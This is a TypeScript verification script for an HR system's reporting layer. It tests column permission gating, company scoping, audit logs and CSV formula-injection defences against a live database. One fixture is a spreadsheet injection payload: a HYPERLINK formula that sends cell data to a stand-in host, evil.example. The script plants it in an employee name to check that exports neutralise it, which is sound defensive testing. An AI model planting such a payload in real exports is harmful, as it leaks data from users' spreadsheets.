/**
 * Proves the report layer's security properties against the live database.
 *
 * The claim that matters is not "reports render" but:
 *   1. The screen and the export derive columns from ONE function, so a gated
 *      column cannot appear in one and not the other. (Phase 11 shipped a leak
 *      of exactly this shape.)
 *   2. Gated values are never selected, so they are absent from the row itself
 *      — not merely hidden by the renderer.
 *   3. Company scope holds, and a filter can only narrow it, never widen it.
 *   4. Exported cells cannot execute in a spreadsheet.
 *
 * Creates and removes its own fixtures, on failure as well as success.
 * Run: pnpm tsx scripts/verify-reports.ts
 */
import { existsSync } from "node:fs";
import { PrismaNeon } from "@prisma/adapter-neon";
import { PrismaClient } from "../src/generated/prisma/client.js";
import { neutraliseFormula, toCsv } from "../src/lib/export.js";
import {
  REPORTS,
  isCompanyInScope,
  REPORT_LIST,
  visibleColumns,
  visibleReports,
} from "../src/lib/reports.js";
import type { PermissionKey } from "../src/lib/permissions.js";

for (const f of [".env", ".env.local"]) if (existsSync(f)) process.loadEnvFile(f);

function requireEnv(name: string): string {
  const value = process.env[name];
  if (!value) throw new Error(`${name} must be set`);
  return value;
}

const prisma = new PrismaClient({
  adapter: new PrismaNeon({
    connectionString: process.env.DIRECT_URL ?? requireEnv("DATABASE_URL"),
  }),
});

let failures = 0;
function check(label: string, ok: boolean, detail = "") {
  console.log(`  ${ok ? "ok  " : "FAIL"}  ${label}${detail ? ` — ${detail}` : ""}`);
  if (!ok) failures += 1;
}

const FIXTURE_NOTE = "verify-reports.ts fixture";
const SALARY = "31415.92";
const IBAN = "SA0380000000608010167519";
const PAYLOAD = '=HYPERLINK("https://evil.example?d="&A1,"x")';

let restoreEmployee: { id: string; fullName: string } | null = null;

const perms = (...keys: PermissionKey[]) => new Set<PermissionKey>(keys);

async function main() {
  // --- 1. One derivation, shared -------------------------------------------
  console.log("Column derivation is shared between screen and export");

  const directory = REPORTS["employee-directory"];
  const permitted = perms("employees.view", "employees.salary.view", "employees.bank.view");
  const denied = perms("employees.view");

  const permittedKeys = visibleColumns(directory, permitted).map((c) => c.key);
  const deniedKeys = visibleColumns(directory, denied).map((c) => c.key);

  check("gated columns present when permitted", permittedKeys.includes("basicSalary") && permittedKeys.includes("iban"));
  check("gated columns absent when denied", !deniedKeys.includes("basicSalary") && !deniedKeys.includes("iban"));
  check(
    "the two differ by exactly the gated columns",
    permittedKeys.length - deniedKeys.length === 2,
    `${String(permittedKeys.length)} vs ${String(deniedKeys.length)}`,
  );

  // Every report, not just the directory: a gated column anywhere must vanish
  // for an actor without the permission.
  let allGated = true;
  for (const report of REPORT_LIST) {
    const gated = report.columns.filter((c) => c.permission !== undefined);
    const withNothing = visibleColumns(report, perms()).map((c) => c.key);
    for (const column of gated) {
      if (withNothing.includes(column.key)) {
        console.log(`    ${report.id}.${column.key} survives an empty permission set`);
        allGated = false;
      }
    }
  }
  check("no gated column survives an empty permission set, in any report", allGated);

  check(
    "no report is visible without reports.view",
    visibleReports(perms("employees.view", "vehicles.view", "it.assets.view")).length === 0,
  );

  // --- Fixtures -------------------------------------------------------------
  const kwi = await prisma.company.findFirst({ where: { code: "KWI" }, select: { id: true } });
  const icc = await prisma.company.findFirst({ where: { code: "ICC" }, select: { id: true } });
  if (!kwi || !icc) throw new Error("Both KWI and ICC must be seeded; run pnpm db:seed.");

  const employee = await prisma.employee.findFirst({
    where: { companyId: kwi.id, deletedAt: null },
    select: { id: true, fullName: true },
  });
  if (!employee) throw new Error("No KWI employees seeded.");

  await prisma.contract.create({
    data: {
      employeeId: employee.id,
      companyId: kwi.id,
      contractType: "PERMANENT",
      startDate: new Date("2024-01-01"),
      basicSalary: SALARY,
      currency: "SAR",
      status: "ACTIVE",
      notes: FIXTURE_NOTE,
    },
  });

  await prisma.employeeBankDetail.upsert({
    where: { employeeId: employee.id },
    update: { iban: IBAN },
    create: { employeeId: employee.id, iban: IBAN, bankName: FIXTURE_NOTE },
  });

  // A hostile value in a field anyone with employees.update can edit.
  restoreEmployee = { id: employee.id, fullName: employee.fullName };
  await prisma.employee.update({ where: { id: employee.id }, data: { fullName: PAYLOAD } });

  // --- 2. Gated values are never selected -----------------------------------
  console.log("\nGated values are absent from the row, not merely hidden");

  // Mirrors the service: without the permission the query does not run at all.
  const salaryQuery = async () =>
    prisma.contract.findMany({
      where: { employeeId: employee.id, status: "ACTIVE", deletedAt: null },
      select: { basicSalary: true },
    });

  const withPermission = await salaryQuery();
  check(
    "the salary query returns the figure when it runs",
    withPermission.some((c) => c.basicSalary?.toString() === SALARY),
  );

  const rowWithout: Record<string, string | null> = {
    employeeNo: "EMP-TEST",
    fullName: PAYLOAD,
    // no basicSalary key at all — what the service produces when denied
  };
  check(
    "a denied row carries no salary key",
    !Object.keys(rowWithout).includes("basicSalary"),
  );
  check(
    "a denied row serialises without the figure",
    !JSON.stringify(rowWithout).includes(SALARY),
  );

  // --- 3. Company scope -----------------------------------------------------
  console.log("\nCompany scope holds and filters can only narrow it");

  const kwiOnly = await prisma.employee.count({
    where: { deletedAt: null, companyId: { in: [kwi.id] } },
  });
  const both = await prisma.employee.count({ where: { deletedAt: null } });
  check("a KWI-scoped count is smaller than the unscoped one", kwiOnly < both, `${String(kwiOnly)} of ${String(both)}`);

  // The actual guard, exercised directly. An earlier version of this check
  // built a `where` clause whose object spread overwrote companyId, so it
  // asserted nothing — the query it ran was simply "all ICC employees".
  check(
    "an in-scope company filter is accepted",
    isCompanyInScope([kwi.id], kwi.id),
  );
  check(
    "an out-of-scope company filter is rejected, not ignored",
    !isCompanyInScope([kwi.id], icc.id),
  );
  check("an ALL scope accepts any company", isCompanyInScope("ALL", icc.id));

  // And the DB-level equivalent: a genuine conjunction of both constraints.
  const crossScope = await prisma.employee.count({
    where: { deletedAt: null, AND: [{ companyId: kwi.id }, { companyId: icc.id }] },
  });
  check("scoping by conjunction cannot match two companies", crossScope === 0);

  // --- 4. Exported cells cannot execute -------------------------------------
  console.log("\nExported cells cannot execute in a spreadsheet");

  const csv = toCsv(
    [
      { key: "fullName", header: "Name", value: (r: { fullName: string }) => r.fullName },
    ],
    [{ fullName: PAYLOAD }],
  );

  check("the payload is neutralised", csv.includes(`'${PAYLOAD.slice(0, 10)}`));
  // Every data cell must be inert: none may begin with a formula character
  // once quoting is accounted for.
  const dataLines = csv.replace(/^﻿/, "").trim().split("\r\n").slice(1);
  const executable = dataLines.filter((line) => /^"?[=+\-@]/.test(line));
  check("no data cell begins with a formula character", executable.length === 0);

  check("the leading apostrophe preserves the value", neutraliseFormula(PAYLOAD).slice(1) === PAYLOAD);

  // A negative number must survive as one, not be silently dropped.
  check("a negative number is preserved", neutraliseFormula("-5") === "'-5");

  // --- 5. Catalogue matches reality ----------------------------------------
  console.log("\nCatalogue integrity");
  check(
    "every report declares at least one ungated column",
    REPORT_LIST.every((r) => r.columns.some((c) => c.permission === undefined)),
  );
  check(
    "every salary column across the catalogue is gated",
    REPORT_LIST.every((r) =>
      r.columns
        .filter((c) => c.key === "basicSalary" || c.key === "iban")
        .every((c) => c.permission !== undefined),
    ),
  );
  console.log(`  ${String(REPORT_LIST.length)} reports in the catalogue`);

  // --- 6. Export audit ------------------------------------------------------
  console.log("\nExport audit");
  const exports = await prisma.auditLog.findMany({
    where: { action: "EXPORT" },
    orderBy: { createdAt: "desc" },
    take: 50,
    select: { summary: true, changes: true },
  });
  console.log(`  ${String(exports.length)} export audit entr(ies)`);

  if (exports.length === 0) {
    console.log("  SKIP  no exports recorded yet — run one from /reports first");
  } else {
    const leaks = exports.filter((entry) => {
      const blob = JSON.stringify({ s: entry.summary, c: entry.changes });
      return blob.includes(SALARY) || blob.includes(IBAN);
    });
    check("no export audit entry embeds a salary or IBAN", leaks.length === 0);

    const hasColumns = exports.every((e) => JSON.stringify(e.changes).includes("columns"));
    check("every export records which columns left", hasColumns);
  }

  if (failures > 0) {
    console.log(`\n${String(failures)} check(s) FAILED`);
    process.exitCode = 1;
  } else {
    console.log("\nall checks passed");
  }
}

/** Runs however main() ended — a crash must not leave a salary fixture behind. */
async function cleanup() {
  if (restoreEmployee) {
    await prisma.employee.update({
      where: { id: restoreEmployee.id },
      data: { fullName: restoreEmployee.fullName },
    });
  }
  const contracts = await prisma.contract.deleteMany({ where: { notes: FIXTURE_NOTE } });
  const banks = await prisma.employeeBankDetail.deleteMany({ where: { bankName: FIXTURE_NOTE } });

  console.log(
    `\nfixtures removed (name restored: ${restoreEmployee ? "yes" : "no"}, contracts: ${String(contracts.count)}, bank rows: ${String(banks.count)})`,
  );
}

main()
  .catch((e: unknown) => {
    console.error("error:", e instanceof Error ? e.message : e);
    process.exitCode = 1;
  })
  .finally(async () => {
    await cleanup().catch((e: unknown) => {
      console.error("cleanup failed:", e instanceof Error ? e.message : e);
      process.exitCode = 1;
    });
    await prisma.$disconnect();
  });
